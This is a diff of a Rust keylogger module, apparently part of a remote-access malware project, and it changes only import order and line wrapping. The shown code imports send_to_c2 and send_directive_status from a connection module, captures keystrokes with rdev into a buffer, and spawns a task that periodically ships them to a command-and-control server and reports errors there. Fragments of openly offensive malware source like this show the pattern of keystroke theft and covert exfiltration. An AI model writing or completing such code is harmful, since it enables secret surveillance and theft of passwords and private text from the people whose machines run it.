@@ -1,10 +1,10 @@
-use crate::connexion::{send_to_c2, send_directive_status};
+use crate::connexion::{send_directive_status, send_to_c2};
 use anyhow::{Context, Result};
 use rdev::{Event, EventType, Key};
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Arc, Mutex};
-use tokio::time::{interval, Duration};
 use std::thread;
+use tokio::time::{interval, Duration};
 
 const MAX_BUFFER_SIZE: usize = 10_000;
 
@@ -365,7 +365,6 @@ fn get_punctuation_or_symbol(key: Key, shift: bool) -> String {
     }
 }
 
-
 fn start_listener_once() {
     if !LISTENER_STARTED.load(Ordering::SeqCst) {
         LISTENER_STARTED.store(true, Ordering::SeqCst);
@@ -389,9 +388,8 @@ pub async fn start_keylogger(send_interval_sec: u64) -> Result<()> {
 
     let logger = KeyLogger::new();
 
-    let handle = tokio::spawn(async move {
-        logger.start(Duration::from_secs(send_interval_sec)).await
-    });
+    let handle =
+        tokio::spawn(async move { logger.start(Duration::from_secs(send_interval_sec)).await });
 
     tokio::spawn(async move {
         match handle.await {
@@ -402,7 +400,8 @@ pub async fn start_keylogger(send_interval_sec: u64) -> Result<()> {
                 let _ = send_directive_status("keylogger", "error", &e.to_string()).await;
             }
             Err(e) => {
-                let _ = send_directive_status("keylogger", "error", &format!("Join error: {}", e)).await;
+                let _ = send_directive_status("keylogger", "error", &format!("Join error: {}", e))
+                    .await;
             }
         }
     });
